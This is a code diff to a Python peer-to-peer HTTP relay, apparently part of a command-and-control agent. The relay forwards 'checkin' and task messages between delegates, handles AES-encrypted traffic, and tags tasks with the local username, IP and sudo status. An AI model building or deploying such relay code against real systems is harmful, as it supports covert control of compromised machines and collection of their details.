@@ -2,16 +2,6 @@ def p2p_server(task_id):
 
     
     class RequestHandler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            message = "Hello!"
-
-            self.protocol_version = "HTTP/1.1"
-            self.send_response(200)
-            self.send_header("Content-Length", len(message))
-            self.end_headers()
-
-            self.wfile.write(bytes(message, "utf8"))
-            return
 
         def do_POST(self):
 
@@ -19,15 +9,26 @@ def p2p_server(task_id):
 
             content_len = int(self.headers.get('content-length', 0))
             post_body = self.rfile.read(content_len)
-            decode = base64.b64decode(post_body)
-            decode = decode.decode("utf-8")
+
+            received_uuid = ""
+            received_message = ""
+            decode = ""
+            encrypted = False
+
+            try:
+                decode = base64.b64decode(post_body)
+                decode = decode.decode("utf-8")
+            except:
+                print(colored("The message is encrypted", "red"))
+                decode = decrypt_AES256(post_body, UUID=True)
+                encrypted = True
 
             received_uuid = str(decode)[:36]
             received_message = json.loads(decode[36:])
 
             print("\n--------------- CURRENT DELEGATE -----------------\n")
-            print("Message = " + str(received_message))
-            print("UUID = " + received_uuid)
+            print("Message = {}".format(received_message))
+            print("UUID = {}".format(received_uuid))
 
             print("----------------------------------------------------------\n")
 
@@ -65,22 +66,17 @@ def p2p_server(task_id):
 
             print("----------------------------------------------------------\n")
 
+
+            reply_message = ""
+
             if received_message["action"] == "checkin":
                 for answer in delegates_aswers:
                     message = base64.b64decode(answer['message'])
                     message = message.decode("utf-8")
                     message = message[36:]
                     message = json.loads(message)
-                    new_uuid = message["id"]
                     if message["action"] == "checkin":
-                        message = answer['message']
-                        self.protocol_version = "HTTP/1.1"
-                        self.send_response(200)
-                        self.send_header("Content-Length", len(message))
-                        self.end_headers()
-                        self.wfile.write(bytes(message, "utf8"))
-                        delegates_aswers.remove(answer)
-
+                        reply_message = answer['message']
 
             else:
                 reply = False
@@ -100,40 +96,49 @@ def p2p_server(task_id):
                                             if task["parameters"] == "":
                                                 task["parameters"] = getpass.getuser() + "@" + ip + ";" + sudo
                                             else:
-                                                task["paramenters"] += " --> " + getpass.getuser() + "@" + ip + ";" + sudo
-                                            message = to64(message_uuid) + to64(str(message))
-                                            self.protocol_version = "HTTP/1.1"
-                                            self.send_response(200)
-                                            self.send_header("Content-Length", len(message))
-                                            self.end_headers()
-                                            self.wfile.write(bytes(message, "utf8"))
+                                                task["parameters"] += " --> " + getpass.getuser() + "@" + ip + ";" + sudo
+                                            reply_message = to64(message_uuid) + to64(str(message))
                                             delegates_aswers.remove(answer)
                                             reply = True
                                         else:
-                                            message = answer['message']
-                                            self.protocol_version = "HTTP/1.1"
-                                            self.send_response(200)
-                                            self.send_header("Content-Length", len(message))
-                                            self.end_headers()
-                                            self.wfile.write(bytes(message, "utf8"))
+                                            reply_message = answer['message']
                                             delegates_aswers.remove(answer)
                                             reply = True
                             else:                    
-                                message = answer['message']
-                                self.protocol_version = "HTTP/1.1"
-                                self.send_response(200)
-                                self.send_header("Content-Length", len(message))
-                                self.end_headers()
-                                self.wfile.write(bytes(message, "utf8"))
+                                reply_message = answer['message']
                                 delegates_aswers.remove(answer)
                                 reply = True
 
 
+            
+            if encrypted:
+
+                # enc = encrypt_AES256(response)
+                # message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
+
+                reply_message = base64.b64decode(reply_message).decode()
+                uuid = reply_message[:36]
+                message = reply_message[36:]
+                enc = encrypt_AES256(message)
+                reply_message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
+
+                print(colored("UUID = {}".format(uuid), "red"))
+                print(colored("Message = {}".format(message), "green"))
+                print(colored("Decrypted Message: \n{}".format(decrypt_AES256(reply_message), "blue")))
+
+            self.protocol_version = "HTTP/1.1"
+            self.send_response(200)
+            self.send_header("Content-Length", len(reply_message))
+            self.end_headers()
+            self.wfile.write(bytes(reply_message, "utf8"))
+            
+
     def run():
-        server = ('', 9090)
+        p2p_port = 9090
+        server = ('', p2p_port)
         httpd = HTTPServer(server, RequestHandler)
         thread = threading.Thread(target = httpd.serve_forever, daemon=True)
         thread.start()
 
-    print("\t- P2P Done")
+        print("\t- P2P Server started on {}:{}".format(getIP(), p2p_port))
     run()
